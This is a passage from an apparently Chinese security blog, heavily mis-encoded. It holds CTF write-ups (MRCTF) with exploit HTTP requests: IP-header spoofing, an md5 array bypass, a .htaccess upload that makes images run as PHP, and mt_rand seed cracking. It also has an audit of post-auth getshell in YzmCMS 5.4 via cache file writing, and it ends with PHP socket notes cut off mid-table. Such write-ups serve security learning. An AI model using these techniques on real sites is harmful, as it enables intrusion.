  if($ip === &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39; ){
  echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);
  echo file_get_contents(change($_GET[&#39;file&#39;])); }
  ?&gt;  </code></pre>
<ul>
<li><p>ç»•è¿‡IPçš„æ–¹æ³•<code>Client-IP: 127.0.0.1</code>,é¶æœºæ²¡æ³•è®¿é—®å¤–ç½‘ï¼Œä½¿ç”¨dataåè®®å»ç»•è¿‡file_get_contents.</p>
</li>
<li><p>è€Œchangeçš„ç ´è§£æ–¹æ³•ä¹Ÿå°±æ˜¯æŠŠåŠ å·æ”¹æˆå‡å·å³å¯ã€‚</p>
</li>
</ul>
<pre><code class="php">
  function dechange($v){ 
      $re = &#39;&#39;; 
      for($i=0;$i&lt;strlen($v);$i++){ 
          $re .= chr ( ord ($v[$i]) - $i*2 ); 
      } 
      return base64_encode($re); 
  }</code></pre>
<ul>
<li><p>exp:</p>
<pre><code class="http">GET /secrettw.php?2333=data:text/html;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI= HTTP/1.1
Host: c5d4aa30-f6d3-44bf-a066-e2ece3b8c939.merak-ctf.site
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Client-IP: 127.0.0.1
</code></pre>
</li>
</ul>
<h2 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h2><p>XFFç»•è¿‡</p>
<h2 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h2><ul>
<li><p>è®¿é—®ç›´æ¥ç»™æºç </p>
<pre><code class="php">include &#39;flag.php&#39;;
$flag=&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;;
if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) {
    $id=$_GET[&#39;id&#39;];
    $gg=$_GET[&#39;gg&#39;];
    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) {
        echo &#39;You got the first step&#39;;
        if(isset($_POST[&#39;passwd&#39;])) {
            $passwd=$_POST[&#39;passwd&#39;];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo &#39;Good Job!&#39;;
                     highlight_file(&#39;flag.php&#39;);
                     die(&#39;By Retr_0&#39;);
                 }
                 else
                 {
                     echo &quot;can you think twice??&quot;;
                 }
            }
            else{
                echo &#39;You can not get it !&#39;;
            }

        }
        else{
            die(&#39;only one way to get the flag&#39;);
        }
}
    else {
        echo &quot;You are not a real hacker!&quot;;
    }
}
else{
    die(&#39;Please input first&#39;);
}
}Please input first</code></pre>
<pre><code></code></pre></li>
<li><p>exp</p>
</li>
</ul>
<p>â€‹```http<br>  POST /?id[]=1&amp;gg[]=2 HTTP/1.1<br>  Host: a3092e2c-32f4-44c0-903b-9d635e724034.merak-ctf.site<br>  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0<br>  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>  Accept-Encoding: gzip, deflate<br>  Content-Type: application/x-www-form-urlencoded<br>  Content-Length: 15<br>  Origin: <a href="http://a3092e2c-32f4-44c0-903b-9d635e724034.merak-ctf.site" target="_blank" rel="noopener">http://a3092e2c-32f4-44c0-903b-9d635e724034.merak-ctf.site</a><br>  Connection: close<br>  Referer: <a href="http://a3092e2c-32f4-44c0-903b-9d635e724034.merak-ctf.site/?id[]=1&amp;gg[]=2" target="_blank" rel="noopener">http://a3092e2c-32f4-44c0-903b-9d635e724034.merak-ctf.site/?id[]=1&amp;gg[]=2</a><br>  Upgrade-Insecure-Requests: 1<br>  X-Forwarded-For: 127.0.0.1</p>
<p>  passwd=1234567a</p>
<pre><code>
## ä½ ä¼ ä½ ğŸå‘¢

- hatcess

```http
  POST /upload.php HTTP/1.1
  Host: b0e25267-c1c2-44f7-8436-023984a8c150.merak-ctf.site
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Content-Type: multipart/form-data; boundary=---------------------------334048973639751065563777068351
  Content-Length: 434
  Origin: http://b0e25267-c1c2-44f7-8436-023984a8c150.merak-ctf.site
  Connection: close
  Referer: http://b0e25267-c1c2-44f7-8436-023984a8c150.merak-ctf.site/
  Cookie: PHPSESSID=042113335d44b84e0d7f11bd0059b8de
  Upgrade-Insecure-Requests: 1
  X-Forwarded-For: 127.0.0.1

  -----------------------------334048973639751065563777068351
  Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;
  Content-Type: image/jpeg

    &lt;FilesMatch &quot;shell.jpg&quot;&gt;
      SetHandler application/x-httpd-php
    &lt;/FilesMatch&gt;

  -----------------------------334048973639751065563777068351
  Content-Disposition: form-data; name=&quot;submit&quot;

  Ã¤Â¸Â€Ã©Â”Ã¥ÂÂ»Ã¤Â¸Â–
  -----------------------------334048973639751065563777068351--</code></pre><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p>æ‰«å‡ºæºç æ³„éœ²ï¼š<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
<pre><code class="php">&lt;?php 
header(&#39;Content-type:text/html; charset=utf-8&#39;);
error_reporting(0);
if(isset($_POST[&#39;login&#39;])){
    $username = $_POST[&#39;username&#39;];
    $password = $_POST[&#39;password&#39;];
    $Private_key = $_POST[&#39;Private_key&#39;];
    if (($username == &#39;&#39;) || ($password == &#39;&#39;) ||($Private_key == &#39;&#39;)) {
        // è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢
        header(&#39;refresh:2; url=login.html&#39;);
        echo &quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;;
        exit;
}
    else if($Private_key != &#39;*************&#39; )
    {
        header(&#39;refresh:2; url=login.html&#39;);
        echo &quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;;
        exit;
    }

    else{
        if($Private_key === &#39;************&#39;){
        $getuser = &quot;SELECT flag FROM user WHERE username= &#39;crispr&#39; AND password = &#39;$password&#39;&quot;.&#39;;&#39;; 
        $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);
        mysql_select_db(&quot;test&quot;,$link);
        $result = mysql_query($getuser);
        while($row=mysql_fetch_assoc($result)){
            echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;;
        }
    }
    }

} 
// genarate public_key 
function public_key($length = 16) {
    $strings1 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
    $public_key = &#39;&#39;;
    for ( $i = 0; $i &lt; $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
  }

  //genarate private_key
  function private_key($length = 12) {
    $strings2 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
    $private_key = &#39;&#39;;
    for ( $i = 0; $i &lt; $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
  }
  $Public_key = public_key();
  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???</code></pre>
<ul>
<li>é€šè¿‡å…¬é’¥å»è¿˜åŸéšæœºæ•°ç§å­åï¼Œç®—å‡ºç§é’¥</li>
</ul>
<pre><code class="php">  &lt;?php

   $pass_now = &quot;KVQP0LdJKRaV3n9D&quot;;
   $allowable_characters = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
   for($j = 0; $j &lt; strlen($pass_now); $j++)

   {

   for ($i = 0; $i &lt;= 61; $i++) {

   if($pass_now[$j] == $allowable_characters[$i])

   {

   echo &quot;$i $i 0 61 &quot;;

   break;

   }

   }

   }</code></pre>
<pre><code class="shell">  ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</code></pre>
<p>  <img src="http://goodcheerleung.gitee.io/mycute/20200401/15857273966848.png" alt="img">![im</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d45484efe7.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d45484efe7.html" class="post-title-link" itemprop="url">YzmCMS-V5.4 åå°Getshell</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2019-12-15 22:12:56" itemprop="dateCreated datePublished" datetime="2019-12-15T22:12:56+08:00">2019-12-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:16:23" itemprop="dateModified" datetime="2020-10-14T17:16:23+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ä»£ç å®¡è®¡/" itemprop="url" rel="index"><span itemprop="name">ä»£ç å®¡è®¡</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>1.7k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>2 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><blockquote>
<p>æ¼æ´æ–‡ä»¶ï¼šyzmphp\core\class\cache_file.class.php</p>
</blockquote>
<ul>
<li>ä»£ç 171-179è¡Œ,ä½¿ç”¨äº†file_put_contents(),å…¶ä¸­<code>$file</code>å’Œ<code>$contents</code>å¯æ§</li>
</ul>
<pre><code class="php">protected function _fileputcontents($file, $contents){
    if($this-&gt;config[&#39;mode&#39;] == 1){
        $contents = serialize($contents);
    }else{
        $contents = &quot;&lt;?php\nreturn &quot;.var_export($contents, true).&quot;;\n?&gt;&quot;;
    }

    $filesize = file_put_contents($file, $contents, LOCK_EX);
    return $filesize ? $filesize : false;
}</code></pre>
<ul>
<li>æˆ‘ä»¬ç»§ç»­è·Ÿè¿›<code>_fileputcontents()</code>,åœ¨åŒä¸€æ–‡ä»¶ä»£ç 62-75è¡Œè°ƒç”¨äº†è¯¥æ–¹æ³•ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›<code>set()</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/1576413364302.png" alt="img"></p>
<blockquote>
<p>æ¼æ´æ–‡ä»¶ï¼šyzmphp\core\function\global.func.php</p>
</blockquote>
<ul>
<li><code>global.func.php</code>çš„1017-1021ä¸­çš„<code>setcache()</code>æ–¹æ³•ç–‘ä¼¼è°ƒç”¨äº†<code>set()</code>æ–¹æ³•,å¹¶ä¸”<code>$name, $data, $timeout</code>å‡å¯æ§ï¼Œæˆ‘ä»¬è·Ÿè¿›<code>load_sys_class(&#39;cache_factory&#39;,&#39;&#39;,0);</code>çœ‹çœ‹<code>get_instance()-&gt;get_cache_instances()</code>åˆ°åº•è°ƒç”¨äº†å“ªä¸ªæ–‡ä»¶ã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764136241676.png" alt="img"></p>
<blockquote>
<p>æ¼æ´æ–‡ä»¶ï¼š\yzmphp\core\class\cache_factory.class.php</p>
</blockquote>
<ul>
<li>å¾ˆæ˜æ˜¾<code>C(&#39;cache_type&#39;)</code>å†³å®šäº†ä»–è°ƒç”¨å“ªä¸ªæ–‡ä»¶ä¸­çš„<code>set()</code>æ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿè¿›<code>cache_type</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764138453674.png" alt="img"></p>
<ul>
<li>è·Ÿè¿›å‘ç°åœ¨<code>common\config\config.php</code>åšäº†å®šä¹‰ï¼Œ<code>cache_type</code>é»˜è®¤ä½¿ç”¨<code>file</code>ï¼Œ<code>mode</code>å­˜åœ¨ä¸¤ç§æ¨¡å¼ï¼Œæˆ‘ä»¬é€‰æ‹©<code>1</code>-åºåˆ—åŒ–çœ‹çœ‹æˆ–è®¸å¯èƒ½è¯»å–ç¼“å­˜å­˜åœ¨ååºåˆ—åŒ–çš„å¯èƒ½ã€‚é‚£ä¹ˆå›å¤´çœ‹ä»–é»˜è®¤ä½¿ç”¨<code>file</code>ä¹Ÿå°±æ˜¯è°ƒç”¨äº†<code>cache_file.class.php</code>æ‰€ä»¥æˆ‘ä»¬çš„çŒœæµ‹æ²¡é”™ã€‚åŒæ—¶è¿™é‡Œè¿˜æ˜¯ç”¨äº†<code>file_config</code>è¿™ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›<code>setcache()</code>æ–¹æ³•</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764140583404.png" alt="img"></p>
<blockquote>
<p>æ¼æ´æ–‡ä»¶ï¼š\common\function\system.func.php</p>
</blockquote>
<ul>
<li>è¿™é‡Œ$modelinfoæ˜¯ä»æ•°æ®åº“ä¸­å¾—åˆ°æ‰€ä»¥å¯æ§ï¼Œ$filenameæŒ‡å®šäº†åç§°<code>modelinfo</code>æˆ–è€…<code>modelinfo_all</code>ã€‚æˆ‘ä»¬ç»§ç»­è·Ÿè¿›<code>get_modelinfo()</code>ä¼šå‘ç°éƒ½ä¸ä¼ å…¥å‚æ•°ï¼Œæ‰€ä»¥é»˜è®¤$typeall = 0,ä¹Ÿå°±æ˜¯è¯´æ–‡ä»¶åç§°å›ºå®š<code>modelinfo</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764172002656.png" alt="img"></p>
<ul>
<li>æˆ‘ä»¬å†å›åˆ°<code>yzmphp\core\class\cache_file.class.php</code>,å‘ç°æ–‡ä»¶åç§°å’Œè·¯å¾„ç”±<code>_file()</code>æ–¹æ³•å†³å®šã€‚è€Œ<code>$id</code>æ­£æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ã€‚æˆ‘ä»¬è·Ÿè¿›<code>_file()</code>æ–¹æ³•</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764175738040.png" alt="img"></p>
<ul>
<li>æˆ‘ä»¬å¯ä»¥å¾—çŸ¥filenameæ˜¯ç”±config[â€˜cache_dirâ€™] å’Œä¼ å…¥çš„<code>$id</code>å’Œ<code>config[&#39;suffix&#39;]</code>æ‹¼æ¥è€Œæˆã€‚æˆ‘ä»¬å†çœ‹<code>config[&#39;suffix&#39;]</code>å’Œ<code>&#39;cache_dir&#39;</code>æ˜¯ä»€ä¹ˆ?</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764216664657.png" alt="img"></p>
<ul>
<li>æˆ‘ä»¬åœ¨å®¡è®¡<code>common\config\config.php</code>æ—¶å€™å·²ç»å‘ç°è¿™é‡Œå®šä¹‰äº†<code>file_config</code>,è¿™æ ·æˆ‘ä»¬å°±å®Œæ•´çŸ¥é“ç¼“å­˜æ–‡ä»¶å†™åœ¨<code>cache/chche_file/modelinfo.cache.php</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764216283148.png" alt="img"></p>
<ul>
<li>è€Œä¸”è¿™é‡Œæ˜¯æ¨¡å‹çš„ç¼“å­˜ï¼Œæˆ‘ä»¬ç›´æ¥åˆ°åå°å†™å…¥ä¸€ä¸ªphpä»£ç çœ‹çœ‹ã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/1576421587721.png" alt="img"></p>
<ul>
<li>éœ€è¦è®¿é—®å‰å°è®©å…¶ç”Ÿæˆæ–°çš„ç¼“å­˜æ–‡ä»¶ã€‚æˆ‘ä»¬æ‰“å¼€ï¼š<code>cache/chche_file/modelinfo.cache.php</code>çœ‹çœ‹</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764187209911.png" alt="img"></p>
<ul>
<li>æˆ‘ä»¬è®¿é—®<code>http://åŸŸå/cache/chche_file/modelinfo.cache.php</code>çœ‹çœ‹ï¼ŒæˆåŠŸgetshell<br> <img src="http://goodcheerleung.gitee.io/mycute/20191215/15764196355940.png" alt="img"></li>
</ul>
<hr>
<h3 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h3><ul>
<li>å¦‚æœ<code>mode</code>é€‰æ‹©çš„æ¨¡å¼æ˜¯2çš„è¯æ˜¯æ— æ³•getshellçš„ï¼Œç”±äº<code>var_export()</code>è¿›è¡Œäº†è½¬ä¹‰ï¼Œæš‚æ—¶æ²¡æœ‰æ‰¾åˆ°æ–¹æ³•ï¼Œä½†æ˜¯è¯¥cmsé»˜è®¤çš„æ˜¯é€‰æ‹©<code>2</code>å¯¼è‡´è¿™ä¸ªæ¼æ´æœ‰ç‚¹é¸¡è‚‹ã€‚</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d649bc731c.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d649bc731c.html" class="post-title-link" itemprop="url">Websocket-phpå­¦ä¹ ç¬”è®°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2019-12-12 11:34:26" itemprop="dateCreated datePublished" datetime="2019-12-12T11:34:26+08:00">2019-12-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:07:07" itemprop="dateModified" datetime="2020-10-14T17:07:07+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/å­¦ä¹ ç¬”è®°/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ ç¬”è®°</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>4.7k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>4 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—"><a href="#åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—" class="headerlink" title="åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—"></a>åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—</h2><p>â€‹        <code>socket_create</code>åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªå¥—æ¥å­—ï¼Œä¹Ÿç§°ä½œä¸€ä¸ªé€šè®¯èŠ‚ç‚¹ã€‚ä¸€ä¸ªå…¸å‹çš„ç½‘ç»œè¿æ¥ç”± 2 ä¸ªå¥—æ¥å­—æ„æˆï¼Œä¸€ä¸ªè¿è¡Œåœ¨å®¢æˆ·ç«¯ï¼Œå¦ä¸€ä¸ªè¿è¡Œåœ¨æœåŠ¡å™¨ç«¯ã€‚</p>
<pre><code class="php">resource socket_create ( int $domain , int $type , int $protocol )</code></pre>
<ul>
<li><code>@parameter domain</code>å‚æ•°æŒ‡å®šå“ªä¸ªåè®®ç”¨åœ¨å½“å‰å¥—æ¥å­—ä¸Š</li>
</ul>
<table>
<thead>
<tr>
<th>Domain</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>AF_INET</code></strong></td>
<td>IPv4 ç½‘ç»œåè®®ã€‚TCP å’Œ UDP éƒ½å¯ä½¿ç”¨æ­¤åè®®ã€‚</td>
</tr>
<tr>
<td><strong><code>AF_INET6</code></strong></td>
<td>IPv6 ç½‘ç»œåè®®ã€‚TCP å’Œ UDP éƒ½å¯ä½¿ç”¨æ­¤åè®®ã€‚</td>
</tr>
<tr>
<td><strong><code>AF_UNIX</code></strong></td>
<td>æœ¬åœ°é€šè®¯åè®®ã€‚å…·æœ‰é«˜æ€§èƒ½å’Œä½æˆæœ¬çš„ IPCï¼ˆè¿›ç¨‹é—´é€šè®¯ï¼‰ã€‚</td>
</tr>
</tbody></table>
<ul>
<li><code>@parameter type</code>å‚æ•°ç”¨äºé€‰æ‹©å¥—æ¥å­—ä½¿ç”¨çš„ç±»å‹</li>
</ul>
<table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>SOCK_STREAM</code></strong></td>
<td>æä¾›ä¸€ä¸ªé¡ºåºåŒ–çš„ã€å¯é çš„ã€å…¨åŒå·¥çš„ã€åŸºäºè¿æ¥çš„å­—èŠ‚æµã€‚æ”¯æŒæ•°æ®ä¼ é€æµé‡æ§åˆ¶æœºåˆ¶ã€‚TCP åè®®å³åŸºäºè¿™ç§æµå¼å¥—æ¥å­—ã€‚</td>
</tr>
<tr>
<td><strong><code>SOCK_DGRAM</code></strong></td>
<td>æä¾›æ•°æ®æŠ¥æ–‡çš„æ”¯æŒã€‚(æ— è¿æ¥ï¼Œä¸å¯é ã€å›ºå®šæœ€å¤§é•¿åº¦).UDPåè®®å³åŸºäºè¿™ç§æ•°æ®æŠ¥æ–‡å¥—æ¥å­—ã€‚</td>
</tr>
<tr>
<td><strong><code>SOCK_SEQPACKET</code></strong></td>
<td>æä¾›ä¸€ä¸ªé¡ºåºåŒ–çš„ã€å¯é çš„ã€å…¨åŒå·¥çš„ã€é¢å‘è¿æ¥çš„ã€å›ºå®šæœ€å¤§é•¿åº¦çš„æ•°æ®é€šä¿¡ï¼›æ•°æ®ç«¯é€šè¿‡æ¥æ”¶æ¯ä¸€ä¸ªæ•°æ®æ®µæ¥è¯»å–æ•´ä¸ªæ•°æ®åŒ…ã€‚</td>
</tr>
<tr>
<td><strong><code>SOCK_RAW</code></strong></td>
<td>æä¾›è¯»å–åŸå§‹çš„ç½‘ç»œåè®®ã€‚è¿™ç§ç‰¹æ®Šçš„å¥—æ¥å­—å¯ç”¨äºæ‰‹å·¥æ„å»ºä»»æ„ç±»å‹çš„åè®®ã€‚ä¸€èˆ¬ä½¿ç”¨è¿™ä¸ªå¥—æ¥å­—æ¥å®ç° ICMP è¯·æ±‚ï¼ˆä¾‹å¦‚ pingï¼‰ã€‚</td>
</tr>
<tr>
<td><strong><code>SOCK_RDM</code></strong></td>
<td>æä¾›ä¸€ä¸ªå¯é çš„æ•°æ®å±‚ï¼Œä½†ä¸ä¿è¯åˆ°è¾¾é¡ºåºã€‚ä¸€èˆ¬çš„æ“ä½œç³»ç»Ÿéƒ½æœªå®ç°æ­¤åŠŸèƒ½ã€‚</td>
</tr>
</tbody></table>
<ul>
<li><code>@parameter protocol</code>æ˜¯è®¾ç½®æŒ‡å®š <code>domain</code> å¥—æ¥å­—ä¸‹çš„å…·ä½“åè®®ã€‚è¿™ä¸ªå€¼å¯ä»¥ä½¿ç”¨ <a href="http://php.net/manual/zh/function.getprotobyname.php" target="_blank" rel="noopener">getprotobyname()</a> å‡½æ•°è¿›è¡Œè¯»å–ã€‚å¦‚æœæ‰€éœ€çš„åè®®æ˜¯ TCP æˆ– UDPï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨å¸¸é‡ <code>SOL_TCP</code> å’Œ <code>SOL_UDP</code> ã€‚</li>
</ul>
<table>
<thead>
<tr>
<th>åç§°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>icmp</td>
<td>Internet Control Message Protocol ä¸»è¦ç”¨äºç½‘å…³å’Œä¸»æœºæŠ¥å‘Šé”™è¯¯çš„æ•°æ®é€šä¿¡ã€‚ä¾‹å¦‚â€œpingâ€å‘½ä»¤ï¼ˆåœ¨ç›®å‰å¤§éƒ¨åˆ†çš„æ“ä½œç³»ç»Ÿä¸­ï¼‰å°±æ˜¯ä½¿ç”¨ ICMP åè®®å®ç°çš„ã€‚</td>
</tr>
<tr>
<td>udp</td>
<td>User Datagram Protocol æ˜¯ä¸€ä¸ªæ— è¿æ¥çš„ã€ä¸å¯é çš„ã€å…·æœ‰å›ºå®šæœ€å¤§é•¿åº¦çš„æŠ¥æ–‡åè®®ã€‚ç”±äºè¿™äº›ç‰¹æ€§ï¼ŒUDP åè®®æ‹¥æœ‰æœ€å°çš„åè®®å¼€é”€ã€‚</td>
</tr>
<tr>
<td>tcp</td>
